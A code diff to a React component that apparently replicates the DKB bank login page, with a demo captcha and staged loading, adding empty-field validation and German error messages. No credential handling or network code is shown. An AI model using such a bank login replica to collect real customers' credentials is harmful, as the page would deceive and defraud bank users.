@@ -17,6 +17,7 @@ const CARD_BORDER = "#CBD9E4";
 const TEXT = "#1A1A1A";
 const TITLE_COLOR = "#373D43";
 const PLACEHOLDER = "#5D7486";
+const ERROR_COLOR = "#D6301A";
 
 const FOOTER_LINKS = [
   { label: "DKB Verwalterplattform", href: "#" },
@@ -37,6 +38,7 @@ const DKB = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [showLoading, setShowLoading] = useState(false);
   const [submitting, setSubmitting] = useState(false);
+  const [errors, setErrors] = useState({ username: false, password: false });
   // Captcha-Demo: "idle" | 0..2 (Ladeschritt) | "done"
   const [captcha, setCaptcha] = useState<"idle" | 0 | 1 | 2 | "done">("idle");
   const [pendingSubmit, setPendingSubmit] = useState(false);
@@ -79,6 +81,12 @@ const DKB = () => {
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     if (submitting) return;
+    const newErrors = {
+      username: username.trim().length === 0,
+      password: password.length === 0,
+    };
+    setErrors(newErrors);
+    if (newErrors.username || newErrors.password) return;
     if (captcha === "done") {
       doLogin();
       return;
@@ -127,61 +135,78 @@ const DKB = () => {
 
           {/* Anmeldename */}
           <div className="relative mb-4">
-            <input
-              id="dkb-username"
-              type="text"
-              autoComplete="off"
-              value={username}
-              onChange={(e) => setUsername(e.target.value)}
-              placeholder=" "
-              className="dkb-input peer w-full outline-none"
-              style={{
-                padding: "24px 18px 12px",
-                fontSize: 16,
-                color: TEXT,
-                fontFamily: "inherit",
-              }}
-            />
-            <label
-              htmlFor="dkb-username"
-              className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
-              style={{ color: PLACEHOLDER }}
-            >
-              Anmeldename
-            </label>
+            <div className="relative">
+              <input
+                id="dkb-username"
+                type="text"
+                autoComplete="off"
+                value={username}
+                onChange={(e) => {
+                  setUsername(e.target.value);
+                  if (errors.username) setErrors((p) => ({ ...p, username: false }));
+                }}
+                placeholder=" "
+                className={`dkb-input peer w-full outline-none${errors.username ? " dkb-input-error" : ""}`}
+                style={{
+                  padding: "24px 18px 12px",
+                  fontSize: 16,
+                  color: TEXT,
+                  fontFamily: "inherit",
+                }}
+              />
+              <label
+                htmlFor="dkb-username"
+                className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
+                style={{ color: errors.username ? ERROR_COLOR : PLACEHOLDER }}
+              >
+                Anmeldename
+              </label>
+            </div>
+            {errors.username && (
+              <p className="flex items-center gap-1.5 mt-1.5 text-[14px]" style={{ color: ERROR_COLOR }}>
+                <svg width="16" height="16" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
+                  <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
+                </svg>
+                Bitte Anmeldenamen eingeben!
+              </p>
+            )}
           </div>
 
           {/* Passwort */}
           <div className="relative mb-5">
-            <input
-              id="dkb-password"
-              type={showPassword ? "text" : "password"}
-              autoComplete="off"
-              value={password}
-              onChange={(e) => setPassword(e.target.value)}
-              placeholder=" "
-              className="dkb-input peer w-full outline-none"
-              style={{
-                padding: "24px 48px 12px 18px",
-                fontSize: 16,
-                color: TEXT,
-                fontFamily: "inherit",
-              }}
-            />
-            <label
-              htmlFor="dkb-password"
-              className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
-              style={{ color: PLACEHOLDER }}
-            >
-              Passwort
-            </label>
-            <button
-              type="button"
-              aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
-              onClick={() => setShowPassword((v) => !v)}
-              className="absolute top-1/2 -translate-y-1/2 right-3 p-2"
-              style={{ color: PLACEHOLDER }}
-            >
+            <div className="relative">
+              <input
+                id="dkb-password"
+                type={showPassword ? "text" : "password"}
+                autoComplete="off"
+                value={password}
+                onChange={(e) => {
+                  setPassword(e.target.value);
+                  if (errors.password) setErrors((p) => ({ ...p, password: false }));
+                }}
+                placeholder=" "
+                className={`dkb-input peer w-full outline-none${errors.password ? " dkb-input-error" : ""}`}
+                style={{
+                  padding: "24px 48px 12px 18px",
+                  fontSize: 16,
+                  color: TEXT,
+                  fontFamily: "inherit",
+                }}
+              />
+              <label
+                htmlFor="dkb-password"
+                className="pointer-events-none absolute left-[18px] top-1/2 -translate-y-1/2 text-[17px] leading-none transition-all duration-200 peer-focus:top-[9px] peer-focus:translate-y-0 peer-focus:text-[14px] peer-[&:not(:placeholder-shown)]:top-[9px] peer-[&:not(:placeholder-shown)]:translate-y-0 peer-[&:not(:placeholder-shown)]:text-[14px]"
+                style={{ color: errors.password ? ERROR_COLOR : PLACEHOLDER }}
+              >
+                Passwort
+              </label>
+              <button
+                type="button"
+                aria-label={showPassword ? "Passwort verbergen" : "Passwort anzeigen"}
+                onClick={() => setShowPassword((v) => !v)}
+                className="absolute top-1/2 -translate-y-1/2 right-3 p-2"
+                style={{ color: PLACEHOLDER }}
+              >
               {showPassword ? (
                 <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round">
                   <path d="M17.94 17.94A10.94 10.94 0 0 1 12 20c-7 0-11-8-11-8a19.77 19.77 0 0 1 4.22-5.22" />
@@ -195,7 +220,16 @@ const DKB = () => {
                   <circle cx="12" cy="12" r="3" />
                 </svg>
               )}
-            </button>
+              </button>
+            </div>
+            {errors.password && (
+              <p className="flex items-center gap-1.5 mt-1.5 text-[14px]" style={{ color: ERROR_COLOR }}>
+                <svg width="16" height="16" viewBox="0 0 21 21" fill={ERROR_COLOR} aria-hidden="true">
+                  <path fillRule="evenodd" clipRule="evenodd" d="M12.958 5.524c-.373-.68-1.391-.694-1.78.02l-5.973 10.97c-.365.67.138 1.474.92 1.474H17.86c.785 0 1.316-.83.93-1.533a300 300 0 0 1-2.933-5.49l-.058-.112c-.915-1.744-1.826-3.48-2.841-5.33m-3.622-.916c1.15-2.11 4.285-2.168 5.46-.027a317 317 0 0 1 2.856 5.356l.061.118a299 299 0 0 0 2.913 5.455c1.108 2.01-.374 4.49-2.767 4.49H6.127c-2.35 0-3.857-2.413-2.763-4.422zm2.707 11.168c.029 0 .052.022.052.05s-.023.05-.052.05a.05.05 0 0 1-.052-.05c0-.028.023-.05.052-.05m-.988.05c0 .528.442.956.988.956s.988-.428.988-.956c0-.527-.442-.955-.988-.955s-.988.428-.988.955m2.029-2.715c0 .555-.466 1.005-1.04 1.005s-1.041-.45-1.041-1.005V8.585c0-.556.466-1.006 1.04-1.006s1.04.45 1.04 1.006z" />
+                </svg>
+                Bitte gib ein Passwort ein.
+              </p>
+            )}
           </div>
 
           {/* Captcha (Demo) */}
